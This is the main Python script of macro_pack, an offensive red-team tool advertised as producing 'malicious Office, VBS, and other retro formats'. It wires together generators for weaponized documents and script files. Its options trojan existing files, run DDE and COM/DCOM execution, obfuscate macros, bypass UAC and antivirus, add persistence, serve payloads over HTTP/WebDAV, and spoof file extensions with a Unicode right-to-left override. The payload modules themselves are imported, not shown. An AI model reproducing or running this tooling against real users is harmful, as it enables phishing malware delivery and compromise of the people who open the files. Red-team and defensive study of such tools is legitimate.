#!/usr/bin/python3
# encoding: utf-8

import os
import sys
import getopt
import logging
import shutil
from modules.excel_gen import ExcelGenerator
from modules.word_gen import WordGenerator
from modules.ppt_gen import PowerPointGenerator
from modules.msproject_gen import MSProjectGenerator
from modules.template_gen import TemplateToVba
from modules.vba_gen import VBAGenerator
from modules.vbs_gen import VBSGenerator
from modules.hta_gen import HTAGenerator
from modules.sct_gen import SCTGenerator
from modules.wsf_gen import WSFGenerator
from modules.word_dde import WordDDE
from modules.excel_dde import ExcelDDE
from modules.visio_gen import VisioGenerator
from modules.access_gen import AccessGenerator
from modules.com_run import ComGenerator
from modules.listen_server import ListenServer
from modules.Wlisten_server import WListenServer
from modules.scf_gen import SCFGenerator
from modules.xsl_gen import XSLGenerator
from modules.url_gen import UrlShortcutGenerator
from modules.glk_gen import GlkGenerator
from modules.lnk_gen import LNKGenerator
from modules.settingsms_gen import SettingsShortcutGenerator
from modules.libraryms_gen import LibraryShortcutGenerator
from modules.inf_gen import InfGenerator
from modules.iqy_gen import IqyGenerator

from common import utils, mp_session, help
from common.utils import MSTypes
from _ast import arg
from modules import mp_module
if sys.platform == "win32":
    try:
        import win32com.client #@UnresolvedImport
    except:
        print("Error: Could not find win32com. You have to download pywin32 at https://sourceforge.net/projects/pywin32/files/pywin32/")
        sys.exit(1)
MP_TYPE="Pro"
try:
    from pro_modules.excel_trojan import ExcelTrojan
    from pro_modules.word_trojan import WordTrojan
    from pro_modules.ppt_trojan import PptTrojan
    from pro_modules.visio_trojan import VisioTrojan
    from pro_modules.msproject_trojan import MsProjectTrojan
    from pro_modules.stealth import Stealth
    from pro_modules.dcom_run import DcomGenerator
    from pro_modules.publisher_gen import PublisherGenerator
    from pro_modules.template_gen import TemplateGeneratorPro
except:
    MP_TYPE="Community"

from colorama import init
from termcolor import colored

# use Colorama to make Termcolor work on Windows too
init()


WORKING_DIR = "temp"
VERSION="1.8_dev"
BANNER = """\

  _  _   __    ___  ____   __     ____   __    ___  __ _
 ( \/ ) / _\  / __)(  _ \ /  \   (  _ \ / _\  / __)(  / )
 / \/ \/    \( (__  )   /(  O )   ) __//    \( (__  )  (
 \_)(_/\_/\_/ \___)(__\_) \__/   (__)  \_/\_/ \___)(__\_)


   Malicious Office, VBS, and other retro formats for pentests and redteam - Version:%s Release:%s

""" % (VERSION, MP_TYPE)


def handleOfficeFormats(mpSession):
    """
    Handle MS Office output formats generation
    """
    if mpSession.stealth == True:
        if mpSession.outputFileType in MSTypes.MS_OFFICE_FORMATS:
            # Add a new empty module to keep VBA library if we hide other modules
            # See http://seclists.org/fulldisclosure/2017/Mar/90
            genericModule = mp_module.MpModule(mpSession)
            genericModule.addVBAModule("")
        else:
            logging.warn(" [!] Stealth option is not available for the format %s" % mpSession.outputFileType)


    # Shall we trojan existing file?
    if mpSession.trojan == False:
        if MSTypes.XL in mpSession.outputFileType:
            generator = ExcelGenerator(mpSession)
            generator.run()
        elif MSTypes.WD in mpSession.outputFileType:
            generator = WordGenerator(mpSession)
            generator.run()
        elif MSTypes.PPT in mpSession.outputFileType:
            generator = PowerPointGenerator(mpSession)
            generator.run()
        elif MSTypes.MPP == mpSession.outputFileType:
            generator = MSProjectGenerator(mpSession)
            generator.run()
        elif MSTypes.VSD in mpSession.outputFileType:
            generator = VisioGenerator(mpSession)
            generator.run()
        elif MSTypes.ACC in mpSession.outputFileType:
            generator = AccessGenerator(mpSession)
            generator.run()
        elif MSTypes.PUB == mpSession.outputFileType and MP_TYPE == "Pro":
            generator = PublisherGenerator(mpSession)
            generator.run()
    else:
        if MSTypes.XL in mpSession.outputFileType:
            if os.path.isfile(mpSession.outputFilePath):
                generator = ExcelTrojan(mpSession)
                generator.run()
            else:
                generator = ExcelGenerator(mpSession)
                generator.run()
        if MSTypes.WD in mpSession.outputFileType:
            if os.path.isfile(mpSession.outputFilePath):
                generator = WordTrojan(mpSession)
                generator.run()
            else:
                generator = WordGenerator(mpSession)
                generator.run()
        if MSTypes.PPT in mpSession.outputFileType:
            if os.path.isfile(mpSession.outputFilePath):
                generator = PptTrojan(mpSession)
                generator.run()
            else:
                generator = PowerPointGenerator(mpSession)
                generator.run()
        if MSTypes.VSD in mpSession.outputFileType:
            if os.path.isfile(mpSession.outputFilePath):
                generator = VisioTrojan(mpSession)
                generator.run()
            else:
                generator = VisioGenerator(mpSession)
                generator.run()
        if MSTypes.ACC in mpSession.outputFileType:
            if os.path.isfile(mpSession.outputFilePath):
                pass
            else:
                generator = AccessGenerator(mpSession)
                generator.run()

        if MSTypes.MPP in mpSession.outputFileType:
            if os.path.isfile(mpSession.outputFilePath):
                generator = MsProjectTrojan(mpSession)
                generator.run()
            else:
                generator = MSProjectGenerator(mpSession)
                generator.run()

    if mpSession.stealth == True:
        obfuscator = Stealth(mpSession)
        obfuscator.run()

    if mpSession.ddeMode: # DDE Attack mode
        if MSTypes.WD in mpSession.outputFileType:
            generator = WordDDE(mpSession)
            generator.run()
        elif MSTypes.XL in mpSession.outputFileType:
            generator = ExcelDDE(mpSession)
            generator.run()
        else:
            logging.warn(" [!] Word and Word97 are only format supported for DDE attacks.")




def main(argv):

    logLevel = "INFO"
    # initialize macro_pack session object
    working_directory = ''.join([os.getcwd(), WORKING_DIR])
    mpSession = mp_session.MpSession(working_directory, VERSION, MP_TYPE)

    try:
        longOptions = ["embed=", "listen=", "port=", "webdav-listen=", "generate=", "quiet", "input-file=", "encode","obfuscate","obfuscate-form", "obfuscate-names", "obfuscate-strings", "file=","template=", "start-function=","uac-bypass","unicode-rtlo=", "dde", "print"]
        shortOptions= "e:l:w:s:f:t:G:hqmop"
        # only for Pro release
        if MP_TYPE == "Pro":
            longOptions.extend(["vbom-encode", "persist","keep-alive", "av-bypass", "trojan=", "stealth", "dcom=", "background"])
            shortOptions += "T:b"
        # Only enabled on windows
        if sys.platform == "win32":
            longOptions.extend([ "run="])

        opts, args = getopt.getopt(argv, shortOptions, longOptions) # @UnusedVariable
    except getopt.GetoptError:
        help.printUsage(BANNER, sys.argv[0], mpSession)
        sys.exit(2)
    for opt, arg in opts:
        if opt in ("-o", "--obfuscate"):
            mpSession.obfuscateForm =  True
            mpSession.obfuscateNames =  True
            mpSession.obfuscateStrings =  True
        elif opt=="--obfuscate-form":
            mpSession.obfuscateForm =  True
        elif opt=="--obfuscate-names":
            mpSession.obfuscateNames =  True
        elif opt=="--obfuscate-strings":
            mpSession.obfuscateStrings =  True
        elif opt=="-s" or opt=="--start-function":
            mpSession.startFunction =  arg
        elif opt=="-l" or opt=="--listen":
            mpSession.listen =  True
            mpSession.listenRoot = os.path.abspath(arg)
        elif opt=="--port":
            mpSession.listenPort = int(arg)
            mpSession.WlistenPort = int(arg)
        elif opt=="-w" or opt=="--webdav-listen":
            mpSession.Wlisten =  True
            mpSession.WRoot = os.path.abspath(arg)
        elif opt == "-f" or opt== "--input-file":
            mpSession.vbaInput = arg
        elif opt == "-e" or opt== "--embed":
            mpSession.embeddedFilePath = os.path.abspath(arg)
        elif opt=="-t" or opt=="--template":
            if arg is None or arg.startswith("-") or  arg == "help" or arg == "HELP":
                help.printTemplatesUsage(BANNER, sys.argv[0])
                sys.exit(0)
            else:
                mpSession.template = arg
        elif opt=="-q" or opt=="--quiet":
            logLevel = "ERROR"
        elif opt=="-p" or opt=="--print":
            mpSession.printFile = True
        elif opt == "--dde":
            if sys.platform == "win32":
                mpSession.ddeMode = True
        elif opt == "--run":
            if sys.platform == "win32":
                mpSession.runTarget = os.path.abspath(arg)
        elif opt=="--uac-bypass":
            mpSession.uacBypass = True
        elif opt == "--unicode-rtlo":
            mpSession.unicodeRtlo = arg
        elif opt in ("-G", "--generate"):
            mpSession.outputFilePath = os.path.abspath(arg)
        elif opt=="-h" or opt=="--help":
            help.printUsage(BANNER, sys.argv[0], mpSession)
            sys.exit(0)
        else:
            if MP_TYPE == "Pro":
                if opt=="--vbom-encode":
                    mpSession.vbomEncode = True
                elif opt=="--persist":
                    mpSession.persist = True
                elif opt=="--keep-alive":
                    mpSession.keepAlive = True
                elif opt=="--av-bypass":
                    mpSession.avBypass = True
                
                elif opt == "-T" or opt=="--trojan":
                    # Document generation enabled only on windows
                    if sys.platform == "win32":
                        mpSession.outputFilePath = os.path.abspath(arg)
                        mpSession.trojan = True
                elif opt == "-b" or opt=="--background":
                    mpSession.background = True
                elif opt == "--stealth":
                    mpSession.stealth = True
                elif opt == "--dcom":
                    mpSession.dcom = True
                    mpSession.dcomTarget = arg
                else:
                    help.printUsage(BANNER, sys.argv[0], mpSession)
                    sys.exit(0)
            else:
                #print("opt:%s, arg:%s",(opt,arg))
                help.printUsage(BANNER, sys.argv[0], mpSession)
                sys.exit(0)

    if logLevel == "INFO":
        os.system('cls' if os.name == 'nt' else 'clear')

    # Logging
    logging.basicConfig(level=getattr(logging, logLevel),format="%(message)s", handlers=[utils.ColorLogFiler()])


    logging.info(colored(BANNER, 'green'))

    logging.info(" [+] Preparations...")

    # Check output file format
    if mpSession.outputFilePath:
        logging.info("   [-] Target output format: %s" %  mpSession.outputFileType)
    elif mpSession.listen == False and mpSession.Wlisten == False and mpSession.runTarget is None and mpSession.dcomTarget is None:
        logging.error("   [!] You need to provide an output file! (-G option)")
        sys.exit(2)


    # Edit outputfile name to spoof extension if unicodeRtlo option is enabled
    if mpSession.unicodeRtlo:
        logging.info("   [-] Inject %s false extension with unicode RTLO" % mpSession.unicodeRtlo)
        # Separate document and extension
        (fileName, fileExtension) = os.path.splitext(mpSession.outputFilePath)
        # Append unicode RTLO to file name
        fileName += '\u202e'
        # Append extension to spoof in reverse order
        fileName += mpSession.unicodeRtlo[::-1]
        # Appent file extension
        fileName +=  fileExtension
        mpSession.outputFilePath = fileName
        logging.info("   [-] File name modified to: %s" %  mpSession.outputFilePath)


    # check input args
    if mpSession.vbaInput is None:
        # Argument not supplied, try to get file content from stdin
        if os.isatty(0) == False: # check if something is being piped
            logging.info("   [-] Waiting for piped input feed...")
            mpSession.stdinContent = sys.stdin.readlines()
            # Close Stdin pipe so we can call input() later without triggering EOF
            #sys.stdin.close()
            sys.stdin = sys.__stdin__
    else:
        if not os.path.isfile(mpSession.vbaInput):
            logging.error("   [!] ERROR: Could not find %s!" % mpSession.vbaInput)
            sys.exit(2)
        else:
            logging.info("   [-] Input file path: %s" % mpSession.vbaInput)


    if mpSession.trojan==False:
        # verify that output file does not already exist
        if os.path.isfile(mpSession.outputFilePath):
            logging.error("   [!] ERROR: Output file %s already exist!" % mpSession.outputFilePath)
            sys.exit(2)
    else:
        # In trojan mode, files are tojaned if they already exist and created if they dont.
        # This concerns only non Office documents for now
        if  mpSession.outputFileType not in MSTypes.MS_OFFICE_FORMATS:
            if os.path.isfile(mpSession.outputFilePath):
                logging.error("   [!] ERROR: Trojan mode not supported for %s format. \nOutput file %s already exist!" % (mpSession.outputFileType,mpSession.outputFilePath))
                sys.exit(2)


    #Create temporary folder
    logging.info("   [-] Temporary working dir: %s" % working_directory)
    if not os.path.exists(working_directory):
        os.makedirs(working_directory)

    try:
        # Create temporary work file.
        if mpSession.ddeMode or mpSession.template or (mpSession.outputFileType not in MSTypes.VB_FORMATS):
            inputFile = os.path.join(working_directory, "command.cmd")
        else:
            inputFile = os.path.join(working_directory, utils.randomAlpha(9)) + ".vba"
        if mpSession.stdinContent is not None:
            logging.info("   [-] Store std input in file..." )
            f = open(inputFile, 'w')
            f.writelines(mpSession.stdinContent)
            f.close()
        else:
            # Create temporary work file
            if mpSession.vbaInput is not None:
                logging.info("   [-] Store input file..." )
                shutil.copy2(mpSession.vbaInput, inputFile)
        if os.path.isfile(inputFile):
            logging.info("   [-] Temporary input file: %s" %  inputFile)



        # Generate template
        if mpSession.template:
            if MP_TYPE == "Pro":
                generator = TemplateGeneratorPro(mpSession)
                generator.run()
            else:
                generator = TemplateToVba(mpSession)
                generator.run()


        # MS Office generation/trojan is only enabled on windows
        if sys.platform == "win32" and mpSession.outputFileType in MSTypes.MS_OFFICE_FORMATS:
            handleOfficeFormats(mpSession)


        if mpSession.outputFileType == MSTypes.VBS:
            generator = VBSGenerator(mpSession)
            generator.run()

        if mpSession.outputFileType == MSTypes.HTA:
            generator = HTAGenerator(mpSession)
            generator.run()

        if mpSession.outputFileType == MSTypes.SCT:
            generator = SCTGenerator(mpSession)
            generator.run()

        if mpSession.outputFileType == MSTypes.WSF:
            generator = WSFGenerator(mpSession)
            generator.run()

        if mpSession.outputFileType == MSTypes.VBA:
            generator = VBAGenerator(mpSession)
            generator.run()


        if mpSession.outputFileType == MSTypes.SCF:
            generator = SCFGenerator(mpSession)
            generator.run()

        if mpSession.outputFileType == MSTypes.XSL:
            generator = XSLGenerator(mpSession)
            generator.run()

        if mpSession.outputFileType == MSTypes.URL:
            generator = UrlShortcutGenerator(mpSession)
            generator.run()

        if mpSession.outputFileType == MSTypes.GLK:
            generator = GlkGenerator(mpSession)
            generator.run()

        if mpSession.outputFileType == MSTypes.LNK:
            generator = LNKGenerator(mpSession)
            generator.run()

        if mpSession.outputFileType == MSTypes.SETTINGS_MS:
            generator = SettingsShortcutGenerator(mpSession)
            generator.run()

        if mpSession.outputFileType == MSTypes.LIBRARY_MS:
            generator = LibraryShortcutGenerator(mpSession)
            generator.run()
            
        if mpSession.outputFileType == MSTypes.INF:
            generator = InfGenerator(mpSession)
            generator.run()
            
        if mpSession.outputFileType == MSTypes.IQY:
            generator = IqyGenerator(mpSession)
            generator.run()

        #run com attack
        if mpSession.runTarget:
            generator = ComGenerator(mpSession)
            generator.run()

        #run dcom attack
        if mpSession.dcom:
            generator = DcomGenerator(mpSession)
            generator.run()

        # Activate Web server
        if mpSession.listen:
            listener = ListenServer(mpSession)
            listener.run()

        if mpSession.Wlisten:
            Wlistener = WListenServer(mpSession)
            Wlistener.run()

    except Exception:
        logging.exception(" [!] Exception caught!")


    logging.info(" [+] Cleaning...")
    shutil.rmtree(working_directory)

    logging.info(" Done!\n")


    sys.exit(0)


if __name__ == '__main__':
    main(sys.argv[1:])
